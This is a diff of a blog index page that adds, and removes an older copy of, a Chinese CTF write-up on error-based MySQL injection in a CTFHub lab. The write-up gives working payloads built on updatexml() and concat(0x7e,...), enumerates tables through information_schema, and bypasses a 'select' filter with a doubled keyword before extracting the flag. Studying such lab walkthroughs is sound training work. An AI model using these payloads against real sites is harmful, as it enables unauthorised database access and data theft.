@@ -152,6 +152,91 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CTFHUB-SQL注入-2小计" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/">CTFHUB-SQL注入-2小计</a>
+    </h1>
+  
+
+        
+        <a href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/" class="archive-article-date">
+  	<time datetime="2022-03-14T15:58:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <meta name="referrer" content="no-referrer">
+
+<h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
+<p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
+<p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
+<p><img src="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314112201847.png" alt="image-20220314112201847"></p>
+<p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
+<p><img src="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314112521952.png" alt="image-20220314112521952"></p>
+<p>4.用updatexml函数进行报错返回值</p>
+<img src="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/blog\xiangmu\home\source\_posts\CTFHUB-SQL注入-2\image-20220314115455054.png" alt="image-20220314115455054" style="zoom:67%;">
+
+<p>构建语句发现只返回了一个~</p>
+<p><img src="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314120622082.png" alt="image-20220314120622082"></p>
+<p>发现中间这个值才会被返回</p>
+<p><img src="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314120731153.png" alt="image-20220314120731153"></p>
+<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
+<p><img src="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314112836216.png" alt="image-20220314112836216"></p>
+<p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
+<p>构造语句</p>
+<p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
+<p>原因：<code>select</code>被过滤双关键字绕过 selselectect</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(flag)from fl4g)),1)#&amp;pass=xxxx</code></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-布尔盲注payload拆解分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -191,77 +276,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/03/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8payload%E6%8B%86%E8%A7%A3%E5%88%86%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CTFHUB-SQL注入-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CTFHUB-SQL注入-2思维小计"><a href="#CTFHUB-SQL注入-2思维小计" class="headerlink" title="CTFHUB-SQL注入-2思维小计"></a>CTFHUB-SQL注入-2思维小计</h1><meta name="referrer" content="no-referrer"/>
-### 函数解析
-
-<p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
-<p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
-<p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
-<p><img src="D:\blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314112201847.png" alt="image-20220314112201847"></p>
-<p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
-<p><img src="D:\blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314112521952.png" alt="image-20220314112521952"></p>
-<p>4.用updatexml函数进行报错返回值</p>
-<img src="D:\blog\xiangmu\home\source\_posts\CTFHUB-SQL注入-2\image-20220314115455054.png" alt="image-20220314115455054" style="zoom:67%;" />
-
-<p>构建语句发现只返回了一个~</p>
-<p><img src="D:\blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314120622082.png" alt="image-20220314120622082"></p>
-<p>发现中间这个值才会被返回</p>
-<p><img src="D:\blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314120731153.png" alt="image-20220314120731153"></p>
-<p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
-<p><img src="D:\blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2\image-20220314112836216.png" alt="image-20220314112836216"></p>
-<p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
-<p>构造语句</p>
-<p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
-<p>原因：<code>select</code>被过滤双关键字绕过 selselectect</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(flag)from fl4g)),1)#&amp;pass=xxxx</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/">展开全文 >></a>
         </p>
       
 
